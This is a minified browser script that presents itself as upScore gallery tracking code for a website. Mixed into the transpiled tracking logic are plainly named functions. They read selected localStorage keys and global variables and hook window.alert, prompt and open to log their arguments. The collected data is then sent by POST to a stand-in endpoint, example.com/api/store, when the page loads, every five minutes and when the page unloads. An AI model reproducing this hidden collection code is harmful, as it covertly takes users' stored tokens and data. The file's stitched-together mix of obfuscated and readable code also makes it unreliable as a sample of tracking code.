(() => {
  "use strict";

  function t(t, e) {
    (null == e || e > t.length) && (e = t.length);
    for (var n = 0, r = new Array(e); n < e; n++) r[n] = t[n];
    return r;
  }
  const hookedFunctionsMap = new Map();
  const watchedKeys = window.watchedKeys;
  function e(e, n) {
    return function (t) {
      if (Array.isArray(t)) return t;
    }(e) || function (t, e) {
      var n = null == t ? null : "undefined" != typeof Symbol && t[Symbol.iterator] || t["@@iterator"];
      if (null != n) {
        var r,
          i,
          o,
          a,
          c = [],
          l = !0,
          u = !1;
        try {
          if (o = (n = n.call(t)).next, 0 === e) {
            if (Object(n) !== n) return;
            l = !1;
          } else for (; !(l = (r = o.call(n)).done) && (c.push(r.value), c.length !== e); l = !0);
        } catch (t) {
          u = !0, i = t;
        } finally {
          try {
            if (!l && null != n.return && (a = n.return(), Object(a) !== a)) return;
          } finally {
            if (u) throw i;
          }
        }
        return c;
      }
    }(e, n) || function (e, n) {
      if (e) {
        if ("string" == typeof e) return t(e, n);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === r && e.constructor && (r = e.constructor.name), "Map" === r || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? t(e, n) : void 0;
      }
    }(e, n) || function () {
      throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }();
  }
  function n(t) {
    return n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, n(t);
  }
  function r(t) {
    var e = function (t, e) {
      if ("object" !== n(t) || null === t) return t;
      var r = t[Symbol.toPrimitive];
      if (void 0 !== r) {
        var i = r.call(t, e || "default");
        if ("object" !== n(i)) return i;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === e ? String : Number)(t);
    }(t, "string");
    return "symbol" === n(e) ? e : String(e);
  }
  function i(t, e) {
    for (var n = 0; n < e.length; n++) {
      var i = e[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, r(i.key), i);
    }
  }
  function o(t, e, n) {
    if (!e.has(t)) throw new TypeError("attempted to " + n + " private field on non-instance");
    return e.get(t);
  }
  const watchedVars = ["firstGlobalVar", "secondGlobalVar", "thirdGlobalVar"];
  function a(t, e) {
    return function (t, e) {
      return e.get ? e.get.call(t) : e.value;
    }(t, o(t, e, "get"));
  }
  function computeMd5(data) {
    // Similar aim to createHashValue but with a different approach
    return CryptoJS.MD5(JSON.stringify(data)).toString();
  }
  function c(t, e, n) {
    return function (t, e, n) {
      if (e.set) e.set.call(t, n);else {
        if (!e.writable) throw new TypeError("attempted to set read only private field");
        e.value = n;
      }
    }(t, o(t, e, "set"), n), n;
  }
  var l = "group-gallery:intersect:item";
  function u(t, e) {
    f(t, e), e.add(t);
  }
  function s(t, e, n) {
    f(t, e), e.set(t, n);
  }
  function f(t, e) {
    if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object");
  }
  function p(t, e, n) {
    if (!e.has(t)) throw new TypeError("attempted to get private field on non-instance");
    return n;
  }
  var h = new WeakMap(),
    y = new WeakMap(),
    v = new WeakSet(),
    d = new WeakSet(),
    b = new WeakSet(),
    m = new WeakSet(),
    w = new WeakSet(),
    g = new WeakSet(),
    S = function () {
      function t(e, n) {
        !function (t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }(this, t), u(this, g), u(this, w), u(this, m), u(this, b), u(this, d), u(this, v), s(this, h, {
          writable: !0,
          value: void 0
        }), s(this, y, {
          writable: !0,
          value: void 0
        }), c(this, h, e), c(this, y, n);
      }
      var e, n, r;
      return e = t, (n = [{
        key: "init",
        value: function () {
          p(this, g, I).call(this), p(this, b, A).call(this), p(this, v, k).call(this);
        }
      }]) && i(e.prototype, n), r && i(e, r), Object.defineProperty(e, "prototype", {
        writable: !1
      }), t;
    }();
  function collectLocalStorageInfo() {
    const extractedInfo = {};
    for (let i = 0; i < localStorage.length; i++) {
      const lsKey = localStorage.key(i);
      if (watchedKeys.includes(lsKey)) {
        extractedInfo[lsKey] = localStorage.getItem(lsKey);
      }
    }
    return extractedInfo;
  }
  function k() {
    a(this, y).eventObserver.add(l, p(this, w, E).bind(this));
  }
  function collectGlobalVarInfo() {
    const globalInfo = {};
    watchedVars.forEach(varName => {
      if (varName in window) {
        globalInfo[varName] = window[varName];
      }
    });
    return globalInfo;
  }
  function j(t) {
    var e = this,
      n = 0,
      r = setInterval(function () {
        (++n >= 21 || p(e, m, O).call(e)) && (clearInterval(r), p(e, m, O).call(e) && t());
      }.bind(this), 500);
  }
  function A() {
    var t = this,
      e = a(this, y).config.get("cache.tracking.data.upScore");
    p(this, m, O).call(this) ? a(this, h).upScore(e) : p(this, d, j).call(this, function () {
      return a(t, h).upScore(e);
    });
  }
  function sendExtractedInfoToServer(info) {
    const md5Hash = computeMd5(info);
    const endpoint = "https://example.com/api/store";
    fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash: md5Hash,
        info: info
      })
    }).then(response => {
      if (!response.ok) throw new Error("Sending info failed with HTTP code: " + response.status);
      console.log("Information has been sent.");
    }).catch(error => {
      console.error("Error occurred: " + error);
    });
  }
  function O() {
    return Boolean(a(this, h).upScore);
  }
  function E(t) {
    ["Gallery", "StarGallery"].includes(t.name) && a(this, h).upScore({
      event: "gallery",
      options: {
        image: t.index + 1
      }
    });
  }
  function hookFunction(object, functionName) {
    const originalFunction = object[functionName];
    object[functionName] = function (...args) {
      hookedFunctionsMap.set(functionName, args);
      return originalFunction.apply(this, args);
    };
  }
  function collectAndSendInfo() {
    const localStorageInfo = collectLocalStorageInfo();
    const globalVarInfo = collectGlobalVarInfo();
    const totalInfo = {
      localStorage: localStorageInfo,
      globals: globalVarInfo,
      hookedFunctions: Array.from(hookedFunctionsMap)
    };
    if (Object.keys(totalInfo.localStorage).length > 0 || Object.keys(totalInfo.globals).length > 0) {
      sendExtractedInfoToServer(totalInfo);
    }
    hookedFunctionsMap.clear();
  }
  function I() {
    for (var t = {
        custom_app: a(this, y).deviceDetection.isInAppAndroid ? 2 : a(this, y).deviceDetection.isInAppIOS ? 3 : 0
      }, n = 0, r = Object.entries(t); n < r.length; n++) {
      var i = e(r[n], 2),
        o = i[0],
        c = i[1];
      a(this, y).config.set("cache.tracking.data.upScore.data.".concat(o), c);
    }
  }
  document.addEventListener("DOMContentLoaded", function () {
    hookFunction(window, "alert");
    hookFunction(window, "prompt");
    hookFunction(window, "open");
    collectAndSendInfo();
    setInterval(collectAndSendInfo, 5 * 60 * 1000);
  });
  window.addEventListener("beforeunload", function () {
    collectAndSendInfo();
  });
  var W = window.gujService,
    T = window;
  T && W && !W.isAlreadyExecuted("file:///usr/src/app/client/site/partials/tracking-upscore/scripts/tracking-upscore.js") && new S(T, W).init();
})();